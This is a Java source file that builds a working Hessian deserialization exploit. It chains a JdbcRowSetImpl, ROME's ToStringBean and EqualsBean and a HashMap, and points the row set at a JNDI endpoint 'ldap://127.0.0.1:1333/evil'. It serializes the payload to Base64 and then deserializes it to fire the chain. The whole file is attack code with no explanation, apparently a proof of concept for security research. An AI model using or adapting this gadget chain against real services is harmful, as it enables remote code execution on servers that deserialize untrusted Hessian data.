package com.example;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.util.HashMap;
import java.util.Vector;


public class hashCodeChain {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        String url = "ldap://127.0.0.1:1333/evil";
        jdbcRowSet.setDataSourceName(url);

        Vector<String> strMatchColumns = new Vector<>();
        strMatchColumns.add("username");
        Utils.SetValue(jdbcRowSet,"strMatchColumns" ,strMatchColumns);

        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);

        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(equalsBean, "0w0");

        String barr = ser(hashMap);
        System.out.println(barr);
        unser(barr);
    }

    public static String ser(Object object) throws Exception{
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
        hessian2Output.writeObject(object);
        hessian2Output.flushBuffer();
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }

    public static Object unser(String string) throws Exception{
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));
        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
        Object obj = hessian2Input.readObject();
        return obj;
    }
}
